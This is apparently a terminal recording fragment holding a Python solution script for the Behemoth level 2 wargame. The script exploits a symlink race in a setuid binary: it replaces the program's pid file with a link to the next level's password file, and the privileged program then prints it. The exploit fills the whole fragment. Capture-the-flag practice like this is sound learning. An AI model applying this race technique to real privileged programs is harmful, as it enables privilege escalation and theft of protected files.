[0.005, "o", "import os, time, subprocess\r\r\n\r\r\n# behemoth2, from objdump:\r\r\n#   sprintf(buf, \"touch %d\", getpid()); lstat(buf); unlink(buf);\r\r\n#   setreuid(euid, euid); system(buf);          <- creates <pid> in CWD\r\r\n#   sleep(2000);\r\r\n#   sprintf(buf, \"cat \"); buf[4]=' '; system(buf);   <- cat <pid>\r\r\n# So we run it in a directory we own, replace the pid file with a symlink\r\r\n# to the password file, and the program cats it for us after the sleep.\r\r\nwork = \"/tmp/b2work\"\r\r\nos.makedirs(work, exist_ok=True)\r\r\nos.chmod(work, 0o777)\r\r\nos.chdir(work)\r\r\nfor f in os.listdir(work):\r\r\n    try: os.unlink(f)\r\r\n    except OSError: pass\r\r\nprint(\"cwd:\", os.getcwd(), flush=True)\r\r\np = subprocess.Popen([\"/behemoth/behemoth2\"])\r\r\nprint(\"pid:\", p.pid, flush=True)\r\r\ntarget = None\r\r\nfor _ in range(500):\r\r\n    for f in os.listdir(work):\r\r\n        if f.isdigit():\r\r\n            target = f\r\r\n            break\r\r\n    if target: break\r\r\n    time.sleep(0.02)\r\r\nprint(\"pidfile:\", target, flush=True)\r\r\nif target:\r\r\n    os.unlink(target)\r\r\n    os.symlink(\"/etc/behemoth_pass/behemoth3\", target)\r\r\n    print(\"replaced\", target, \"->\", os.readlink(target), flush=True)\r\r\n# heartbeat every 30 s so ssh does not idle-timeout during sleep(2000)\r\r\nwhile p.poll() is None:\r\r\n    print(\"alive\", int(time.time()), flush=True)\r\r\n    time.sleep(30)\r\r\nprint(\"B2\" + \"DONE\", flush=True)\r\r\n\r\r\n"]
[0.012, "o", "\u001b]3008;end=7b45bb1b-8802-4707-8ba5-7935c3c0d076;exit=success\u001b\\"]
